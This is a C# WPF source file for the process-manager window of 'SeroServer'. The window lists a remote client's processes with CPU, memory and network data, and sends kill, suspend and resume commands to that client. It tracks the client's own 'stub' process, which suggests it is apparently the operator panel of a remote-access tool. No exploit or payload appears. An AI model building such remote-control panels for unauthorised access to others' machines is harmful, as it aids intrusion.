using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Windows;
using DevExpress.Xpf.Core;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Threading;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public class ProcEntryVM : INotifyPropertyChanged
{
    public event PropertyChangedEventHandler? PropertyChanged;
    private void N([CallerMemberName] string? p = null) => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(p));

    private int    _pid;
    private int    _parentPid;
    private string _name = "";
    private long   _memory;
    private float  _cpuUsage;
    private int    _tcpConns;
    private string _title = "";
    private string _exePath = "";
    private bool   _isClient;
    private float  _netKbps;
    private List<string>? _remoteIps;
    private BitmapSource? _icon;

    public int Pid { get => _pid; set { if (_pid != value) { _pid = value; N(); } } }
    public int ParentPid { get => _parentPid; set { if (_parentPid != value) { _parentPid = value; N(); } } }
    public string Name { get => _name; set { if (_name != value) { _name = value; N(); } } }
    public long Memory { get => _memory; set { if (_memory != value) { _memory = value; N(); N(nameof(MemDisplay)); N(nameof(MemHeatBrush)); N(nameof(MemTextBrush)); } } }
    public float CpuUsage { get => _cpuUsage; set { if (_cpuUsage != value) { _cpuUsage = value; N(); N(nameof(CpuDisplay)); N(nameof(CpuHeatBrush)); N(nameof(CpuTextBrush)); } } }
    public int TcpConns { get => _tcpConns; set { if (_tcpConns != value) { _tcpConns = value; N(); N(nameof(NetDisplay)); } } }
    public List<string>? RemoteIps { get => _remoteIps; set { if (_remoteIps != value) { _remoteIps = value; N(); N(nameof(NetDisplay)); } } }
    public string Title { get => _title; set { if (_title != value) { _title = value; N(); } } }
    public string ExePath { get => _exePath; set { if (_exePath != value) { _exePath = value; N(); } } }
    public bool IsClient { get => _isClient; set { if (_isClient != value) { _isClient = value; N(); } } }
    public float NetKbps { get => _netKbps; set { if (_netKbps != value) { _netKbps = value; N(); N(nameof(NetDisplay)); } } }

    public string NetDisplay
    {
        get
        {
            var parts = new System.Collections.Generic.List<string>();
            if (NetKbps >= 1f)
                parts.Add(NetKbps >= 1024f ? $"{NetKbps/1024f:F1} MB/s" : $"{NetKbps:F0} KB/s");
            if (RemoteIps is { Count: > 0 })
            {
                parts.AddRange(RemoteIps.Take(2));
                if (RemoteIps.Count > 2) parts.Add($"+{RemoteIps.Count - 2}");
            }
            else if (TcpConns > 0 && parts.Count == 0)
                parts.Add($"{TcpConns} conn");
            return parts.Count > 0 ? string.Join("  ", parts) : "—";
        }
    }

    // Tree view support
    private int _depth;
    public int Depth { get => _depth; set { _depth = value; N(); N(nameof(TreeIndent)); N(nameof(TreePrefix)); } }
    public Thickness TreeIndent  => new(_depth * 16, 0, 0, 0);
    public string    TreePrefix  => _depth == 0 ? "" : "└─ ";

    public long   TotalRamMb { get; set; }
    public string MemDisplay
    {
        get
        {
            var mb = Memory > 1024 ? $"{Memory / 1024:N0} MB" : $"{Memory:N0} KB";
            if (TotalRamMb > 0)
            {
                float pct = Memory / 1024f / TotalRamMb * 100f;
                return $"{mb}  {pct:F1}%";
            }
            return mb;
        }
    }

    public string CpuDisplay => CpuUsage > 0.05f ? $"{CpuUsage:F1}%" : "—";

    // Dark-theme heat palette
    private static readonly Color _cold  = Color.FromRgb(0x0C, 0x0D, 0x18);
    private static readonly Color _warm1 = Color.FromRgb(0x10, 0x25, 0x4A);
    private static readonly Color _warm2 = Color.FromRgb(0x1A, 0x3A, 0x28);
    private static readonly Color _hot1  = Color.FromRgb(0x40, 0x28, 0x10);
    private static readonly Color _hot2  = Color.FromRgb(0x60, 0x14, 0x14);
    // Light-theme heat palette
    private static readonly Color _lCold  = Color.FromRgb(0xEE, 0xF0, 0xF8);
    private static readonly Color _lWarm1 = Color.FromRgb(0xCC, 0xE0, 0xFF);
    private static readonly Color _lWarm2 = Color.FromRgb(0xC8, 0xEE, 0xD8);
    private static readonly Color _lHot1  = Color.FromRgb(0xFF, 0xD8, 0xB0);
    private static readonly Color _lHot2  = Color.FromRgb(0xFF, 0xB8, 0xB8);

    private static bool IsLightTheme()
    {
        var t = DevExpress.Xpf.Core.ApplicationThemeHelper.ApplicationThemeName ?? "";
        return t.Contains("Light", StringComparison.OrdinalIgnoreCase)
            || t.Contains("White", StringComparison.OrdinalIgnoreCase)
            || t.Contains("Silver", StringComparison.OrdinalIgnoreCase)
            || (t.Contains("Office", StringComparison.OrdinalIgnoreCase)
                && !t.Contains("HighContrast", StringComparison.OrdinalIgnoreCase)
                && !t.Contains("Dark", StringComparison.OrdinalIgnoreCase))
            || t is "VS2010" or "MetropolisLight" or "DeepBlue"
                 or "Seven" or "WXI" or "Basic" or "WindowsXP";
    }

    public Brush CpuHeatBrush => HeatBrush(CpuUsage);
    public Brush MemHeatBrush => HeatBrush(Memory > 0 ? Math.Min(100f, Memory / 10240f * 100f) : 0f);
    public Brush CpuTextBrush => IsLightTheme()
        ? (CpuUsage > 60 ? Brushes.Black : new SolidColorBrush(Color.FromRgb(0x1E, 0x40, 0x8A)))
        : (CpuUsage > 60 ? Brushes.White : new SolidColorBrush(Color.FromRgb(0xC0, 0xD0, 0xE8)));
    public Brush MemTextBrush => IsLightTheme()
        ? (Memory > 512 * 1024 ? Brushes.Black : new SolidColorBrush(Color.FromRgb(0x1E, 0x40, 0x8A)))
        : (Memory > 512 * 1024 ? Brushes.White : new SolidColorBrush(Color.FromRgb(0xC0, 0xD0, 0xE8)));

    private static Brush HeatBrush(float pct)
    {
        pct = Math.Max(0f, Math.Min(100f, pct));
        bool light = IsLightTheme();
        var (cold, warm1, warm2, hot1, hot2) = light
            ? (_lCold, _lWarm1, _lWarm2, _lHot1, _lHot2)
            : (_cold,  _warm1,  _warm2,  _hot1,  _hot2);
        Color c;
        if (pct < 5f)        c = cold;
        else if (pct < 25f)  c = Lerp(cold, warm1, (pct - 5f) / 20f);
        else if (pct < 50f)  c = Lerp(warm1, warm2, (pct - 25f) / 25f);
        else if (pct < 75f)  c = Lerp(warm2, hot1, (pct - 50f) / 25f);
        else                  c = Lerp(hot1, hot2, (pct - 75f) / 25f);
        return new SolidColorBrush(c);
    }

    private static Color Lerp(Color a, Color b, float t) =>
        Color.FromRgb(
            (byte)(a.R + (b.R - a.R) * t),
            (byte)(a.G + (b.G - a.G) * t),
            (byte)(a.B + (b.B - a.B) * t));

    public BitmapSource? IconImage { get => _icon; set { if (_icon != value) { _icon = value; N(); } } }
}

public partial class ProcessManagerWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<ProcEntryVM> _all  = [];
    private          ObservableCollection<ProcEntryVM> _view = [];
    private string   _filter   = "";
    private bool     _treeMode = false;
    private readonly DispatcherTimer _autoTimer;

    public ProcessManagerWindow(TlsServer server, string clientId, string label)
    {
        InitializeComponent();
        RubberBandSelector.Enable(GridProcs);
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = label;
        GridProcs.ItemsSource = _view;

        _autoTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(2) };
        _autoTimer.Tick += (_, _) => RequestRefresh();
        _autoTimer.Start();

        _server.RegisterHandler(clientId, PacketType.ProcListResult, OnProcList);
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _autoTimer.Stop();
            _server.UnregisterHandler(clientId, PacketType.ProcListResult);
            Lang.LanguageChanged -= ApplyLanguage;
        };

        RequestRefresh();
    }

    private void ApplyLanguage()
    {
        Title = Lang.Get("FEAT_PROCESS_MGR");
        if (ColProcName     != null) ColProcName.Header     = Lang.Get("WIN_COL_NAME");
        if (ColPid          != null) ColPid.Header          = Lang.Get("PM_COL_PID");
        if (ColCpu          != null) ColCpu.Header          = Lang.Get("PM_COL_CPU");
        if (ColMem          != null) ColMem.Header          = Lang.Get("PM_COL_MEM");
        if (ColNet          != null) ColNet.Header          = Lang.Get("WIN_COL_NETWORK");
        if (ColTitle        != null) ColTitle.Header        = Lang.Get("WIN_COL_TITLE");
        if (TxtBtnTree      != null) TxtBtnTree.Text        = _treeMode ? Lang.Get("ACT_TREE") + " ✓" : Lang.Get("ACT_TREE");
        if (TxtStatus       != null && string.IsNullOrEmpty(TxtStatus.Text))
            TxtStatus.Text = Lang.Get("PM_STATUS_READY");
        if (MnuProcKill    != null) MnuProcKill.Header    = Lang.Get("ACT_KILL");
        if (MnuProcSuspend != null) MnuProcSuspend.Header = Lang.Get("ACT_SUSPEND");
        if (MnuProcResume  != null) MnuProcResume.Header  = Lang.Get("ACT_RESUME");
        if (MnuProcCopyPid  != null) MnuProcCopyPid.Header  = Lang.Get("ACT_COPY_PID");
        if (MnuProcCopyName != null) MnuProcCopyName.Header = Lang.Get("ACT_COPY_NAME");
        if (MnuProcCopyPath != null) MnuProcCopyPath.Header = Lang.Get("ACT_COPY_PATH");
        if (MnuProcRefresh  != null) MnuProcRefresh.Header  = Lang.Get("ACT_REFRESH");
    }

    private void RequestRefresh()
    {
        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.ProcGetList });
    }

    private void OnProcList(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<ProcListResultData>(pkt.Data);
        if (d == null) return;

        _ = Task.Run(() =>
        {
            var totalRam = d.TotalRamMb;
            var stubPid  = d.StubPid;
            var byPid = d.Processes.ToDictionary(p => p.Pid);

            Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, () =>
            {
                var selectedPid = (GridProcs.SelectedItem as ProcEntryVM)?.Pid;
                var viewSortDescriptions = GridProcs.Items.SortDescriptions
                    .Select(sd => new SortDescription(sd.PropertyName, sd.Direction)).ToList();
                var viewSortArrows = GridProcs.Columns.Select(c => c.SortDirection).ToList();

                // Update existing or add new
                var seenPids = new System.Collections.Generic.HashSet<int>();
                foreach (var p in d.Processes)
                {
                    seenPids.Add(p.Pid);
                    var existing = _all.FirstOrDefault(x => x.Pid == p.Pid);
                    if (existing != null)
                    {
                        // Update in-place instead of replacing
                        existing.ParentPid = p.ParentPid;
                        existing.Name = p.Name;
                        existing.Memory = p.Memory;
                        existing.TotalRamMb = totalRam;
                        existing.CpuUsage = p.CpuUsage;
                        existing.Title = p.Title;
                        existing.ExePath = p.ExePath;
                        existing.TcpConns = p.TcpConns;
                        existing.RemoteIps = p.RemoteIps;
                        existing.IsClient = stubPid > 0 && p.Pid == stubPid;
                        existing.NetKbps = p.NetKbps;
                    }
                    else
                    {
                        // New process
                        _all.Add(new ProcEntryVM
                        {
                            Pid        = p.Pid,
                            ParentPid  = p.ParentPid,
                            Name       = p.Name,
                            Memory     = p.Memory,
                            TotalRamMb = totalRam,
                            CpuUsage   = p.CpuUsage,
                            Title      = p.Title,
                            ExePath    = p.ExePath,
                            TcpConns   = p.TcpConns,
                            RemoteIps  = p.RemoteIps,
                            IsClient   = stubPid > 0 && p.Pid == stubPid,
                            NetKbps    = p.NetKbps,
                        });
                    }
                }

                // Remove dead processes
                for (int i = _all.Count - 1; i >= 0; i--)
                    if (!seenPids.Contains(_all[i].Pid))
                        _all.RemoveAt(i);

                ApplyFilter();
                if (selectedPid.HasValue)
                    GridProcs.SelectedItem = _view.FirstOrDefault(p => p.Pid == selectedPid.Value);

                // Restore sort
                foreach (var sd in viewSortDescriptions)
                    GridProcs.Items.SortDescriptions.Add(sd);
                for (int i = 0; i < GridProcs.Columns.Count && i < viewSortArrows.Count; i++)
                    GridProcs.Columns[i].SortDirection = viewSortArrows[i];

                TxtCount.Text = $"({d.Processes.Count})";
                TxtStatus.Text = string.Format(Lang.Get("PM_UPDATED"), DateTime.Now.ToString("HH:mm:ss"), d.Processes.Count);
            });

            // Phase 2: load icons in background, push each one to its VM as it arrives.
            // Cached icons (subsequent refreshes) return instantly from _iconCache.
            foreach (var p in d.Processes)
            {
                if (!string.IsNullOrEmpty(p.ExePath))
                {
                    var icon = GetIcon(p.ExePath);
                    if (icon != null)
                    {
                        var pid = p.Pid;
                        Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, () =>
                        {
                            var vm = _all.FirstOrDefault(x => x.Pid == pid);
                            if (vm != null) vm.IconImage = icon;
                        });
                    }
                }
            }
        });
    }

    private void ApplyFilter()
    {
        IEnumerable<ProcEntryVM> source = _all;
        if (!string.IsNullOrWhiteSpace(_filter))
            source = _all.Where(p => p.Name.Contains(_filter, StringComparison.OrdinalIgnoreCase)
                                  || p.Title.Contains(_filter, StringComparison.OrdinalIgnoreCase)
                                  || p.Pid.ToString().Contains(_filter));

        var list = _treeMode ? BuildTree(source.ToList()) : source.ToList();
        var newPids = new System.Collections.Generic.HashSet<int>(list.Select(x => x.Pid));

        // Only replace ItemsSource if the filtered list changed
        if (_view.Count != list.Count || !_view.Select(x => x.Pid).SequenceEqual(newPids))
        {
            var savedSorts  = GridProcs.Items.SortDescriptions
                .Select(sd => new SortDescription(sd.PropertyName, sd.Direction)).ToList();
            var savedArrows = GridProcs.Columns.Select(c => c.SortDirection).ToList();

            _view = new ObservableCollection<ProcEntryVM>(list);
            GridProcs.ItemsSource = _view;

            foreach (var sd in savedSorts)
                GridProcs.Items.SortDescriptions.Add(sd);
            for (int i = 0; i < GridProcs.Columns.Count && i < savedArrows.Count; i++)
                GridProcs.Columns[i].SortDirection = savedArrows[i];
        }
    }

    // Build DFS-ordered tree with depth levels for visual indentation.
    // Processes whose PPID doesn't exist in the list become roots.
    private static List<ProcEntryVM> BuildTree(List<ProcEntryVM> flat)
    {
        var byPid    = flat.ToDictionary(p => p.Pid);
        var children = new Dictionary<int, List<ProcEntryVM>>();

        // Reset depths and group by parent
        foreach (var p in flat)
        {
            p.Depth = 0;
            if (p.ParentPid > 0 && byPid.ContainsKey(p.ParentPid))
            {
                if (!children.TryGetValue(p.ParentPid, out var list)) children[p.ParentPid] = list = [];
                list.Add(p);
            }
        }

        // Collect roots: processes with no parent in the list
        var childSet = children.Values.SelectMany(x => x).Select(x => x.Pid).ToHashSet();
        var roots    = flat.Where(p => !childSet.Contains(p.Pid)).OrderBy(p => p.Name).ToList();

        var result = new List<ProcEntryVM>(flat.Count);
        void Dfs(ProcEntryVM node, int depth)
        {
            node.Depth = depth;
            result.Add(node);
            if (!children.TryGetValue(node.Pid, out var kids)) return;
            foreach (var kid in kids.OrderBy(k => k.Name))
                Dfs(kid, depth + 1);
        }
        foreach (var root in roots) Dfs(root, 0);

        // Append any orphaned processes (DFS-visited set != flat set)
        var visited = result.Select(p => p.Pid).ToHashSet();
        foreach (var p in flat.Where(p => !visited.Contains(p.Pid)))
        { p.Depth = 0; result.Add(p); }

        return result;
    }

    private void BtnTree_Click(object s, RoutedEventArgs e)
    {
        _treeMode = !_treeMode;
        if (TxtBtnTree != null)
            TxtBtnTree.Text = _treeMode ? Lang.Get("ACT_TREE") + " ✓" : Lang.Get("ACT_TREE");
        ApplyFilter();
    }

    private void TxtSearch_TextChanged(object s, TextChangedEventArgs e)
    {
        _filter = TxtSearch.Text.Trim();
        ApplyFilter();
    }

    // Typing any printable character while grid is focused → redirect to search box
    private void GridProcs_PreviewKeyDown(object s, System.Windows.Input.KeyEventArgs e)
    {
        if (e.Key == System.Windows.Input.Key.Escape)
        {
            TxtSearch.Clear();
            e.Handled = true;
            return;
        }
        if (e.Key == System.Windows.Input.Key.Back)
        {
            if (TxtSearch.Text.Length > 0)
                TxtSearch.Text = TxtSearch.Text[..^1];
            e.Handled = true;
            return;
        }
        var c = System.Windows.Input.KeyInterop.VirtualKeyFromKey(e.Key);
        var ch = (char)c;
        if (char.IsLetterOrDigit(ch) || ch == '.' || ch == '_' || ch == '-')
        {
            var str = e.KeyboardDevice.Modifiers.HasFlag(System.Windows.Input.ModifierKeys.Shift)
                ? ch.ToString().ToUpper() : ch.ToString().ToLower();
            TxtSearch.Text += str;
            TxtSearch.CaretIndex = TxtSearch.Text.Length;
            e.Handled = true;
        }
    }

    [System.Runtime.InteropServices.DllImport("shell32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private static extern nint SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbSFI, uint uFlags);
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    private static extern bool DestroyIcon(nint hIcon);
    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private struct SHFILEINFO { public nint hIcon; public int iIcon; public uint dwAttributes; [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = 260)] public string szDisplayName; [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = 80)] public string szTypeName; }
    private const uint SHGFI_ICON           = 0x100;
    private const uint SHGFI_SMALLICON      = 0x001;
    private const uint SHGFI_USEFILEATTRIBS = 0x010;
    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;

    // Cache icons by path to avoid repeated SHGetFileInfo calls
    private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, BitmapSource?> _iconCache = new();

    private static BitmapSource? GetIcon(string path)
    {
        var key = string.IsNullOrEmpty(path) ? "__generic__" : path;
        if (_iconCache.TryGetValue(key, out var cached)) return cached;

        // SHGetFileInfo (USEFILEATTRIBUTES) + CreateBitmapSourceFromHIcon + Freeze() are
        // safe on background threads — no Dispatcher.Invoke needed, which was causing
        // 150+ synchronous UI-thread round-trips and making the window slow to populate.
        BitmapSource? result = null;
        try
        {
            if (!string.IsNullOrEmpty(path) && System.IO.File.Exists(path))
            {
                using var icon = System.Drawing.Icon.ExtractAssociatedIcon(path);
                if (icon != null)
                {
                    result = System.Windows.Interop.Imaging.CreateBitmapSourceFromHIcon(
                        icon.Handle, Int32Rect.Empty, BitmapSizeOptions.FromEmptyOptions());
                    result?.Freeze();
                }
            }
            if (result == null)
            {
                var sfi = new SHFILEINFO();
                var fakePath = string.IsNullOrEmpty(path) ? "unknown.exe"
                    : (System.IO.Path.GetExtension(path).Length > 0 ? System.IO.Path.GetFileName(path) : path + ".exe");
                if (SHGetFileInfo(fakePath, FILE_ATTRIBUTE_NORMAL, ref sfi,
                    (uint)System.Runtime.InteropServices.Marshal.SizeOf<SHFILEINFO>(),
                    SHGFI_ICON | SHGFI_SMALLICON | SHGFI_USEFILEATTRIBS) != 0 && sfi.hIcon != 0)
                {
                    result = System.Windows.Interop.Imaging.CreateBitmapSourceFromHIcon(
                        sfi.hIcon, Int32Rect.Empty, BitmapSizeOptions.FromEmptyOptions());
                    result?.Freeze();
                    DestroyIcon(sfi.hIcon);
                }
            }
        }
        catch { }

        _iconCache[key] = result;
        return result;
    }

    private void BtnRefresh_Click(object s, RoutedEventArgs e) => RequestRefresh();

    private void BtnKill_Click(object s, RoutedEventArgs e)
    {
        var sel = GridProcs.SelectedItems.Cast<ProcEntryVM>().ToList();
        if (sel.Count == 0) return;
        string msg = sel.Count == 1
            ? string.Format(Lang.Get("PM_KILL_1"), sel[0].Name, sel[0].Pid)
            : string.Format(Lang.Get("PM_KILL_N"), sel.Count);
        if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        foreach (var vm in sel)
            _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.ProcKill, Data = JsonConvert.SerializeObject(new ProcKillData { Pid = vm.Pid }) });
        TxtStatus.Text = sel.Count == 1 ? $"{Lang.Get("ACT_KILL")} → PID {sel[0].Pid} ({sel[0].Name})" : $"{Lang.Get("ACT_KILL")} → {sel.Count}";
        ServerWindow.ReportGlobalActivity("Kill process", sel.Count == 1 ? sel[0].Name : $"{sel.Count} processes", "complete");
        ServerWindow.LogGlobal($"[PROC] Terminated process {(sel.Count == 1 ? $"'{sel[0].Name}' (PID {sel[0].Pid})" : $"{sel.Count} processes")} on client {_clientId}.");
    }

    private void BtnSuspend_Click(object s, RoutedEventArgs e)
    {
        var sel = GridProcs.SelectedItems.Cast<ProcEntryVM>().ToList();
        if (sel.Count == 0) return;
        foreach (var vm in sel)
            _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.ProcSuspend, Data = JsonConvert.SerializeObject(new ProcSuspendData2 { Pid = vm.Pid }) });
        TxtStatus.Text = sel.Count == 1 ? $"{Lang.Get("ACT_SUSPEND")} → PID {sel[0].Pid} ({sel[0].Name})" : $"{Lang.Get("ACT_SUSPEND")} → {sel.Count}";
        ServerWindow.ReportGlobalActivity("Suspend process", sel.Count == 1 ? sel[0].Name : $"{sel.Count} processes", "complete");
        ServerWindow.LogGlobal($"[PROC] Suspended process {(sel.Count == 1 ? $"'{sel[0].Name}' (PID {sel[0].Pid})" : $"{sel.Count} processes")} on client {_clientId}.");
    }

    private void BtnResume_Click(object s, RoutedEventArgs e)
    {
        var sel = GridProcs.SelectedItems.Cast<ProcEntryVM>().ToList();
        if (sel.Count == 0) return;
        foreach (var vm in sel)
            _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.ProcResume, Data = JsonConvert.SerializeObject(new ProcResumeData2 { Pid = vm.Pid }) });
        TxtStatus.Text = sel.Count == 1 ? $"{Lang.Get("ACT_RESUME")} → PID {sel[0].Pid} ({sel[0].Name})" : $"{Lang.Get("ACT_RESUME")} → {sel.Count}";
        ServerWindow.ReportGlobalActivity("Resume process", sel.Count == 1 ? sel[0].Name : $"{sel.Count} processes", "complete");
        ServerWindow.LogGlobal($"[PROC] Resumed process {(sel.Count == 1 ? $"'{sel[0].Name}' (PID {sel[0].Pid})" : $"{sel.Count} processes")} on client {_clientId}.");
    }


    private void GridProcs_CopyPid_Click(object s, RoutedEventArgs e)
    {
        if (GridProcs.SelectedItem is ProcEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.Pid.ToString()); TxtStatus.Text = $"Copied PID: {vm.Pid}"; } catch { }
    }

    private void GridProcs_CopyName_Click(object s, RoutedEventArgs e)
    {
        if (GridProcs.SelectedItem is ProcEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.Name); TxtStatus.Text = $"Copied: {vm.Name}"; } catch { }
    }

    private void GridProcs_CopyPath_Click(object s, RoutedEventArgs e)
    {
        if (GridProcs.SelectedItem is ProcEntryVM vm && !string.IsNullOrEmpty(vm.ExePath))
            try { System.Windows.Clipboard.SetText(vm.ExePath); TxtStatus.Text = $"Copied path: {vm.ExePath}"; } catch { }
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();
}
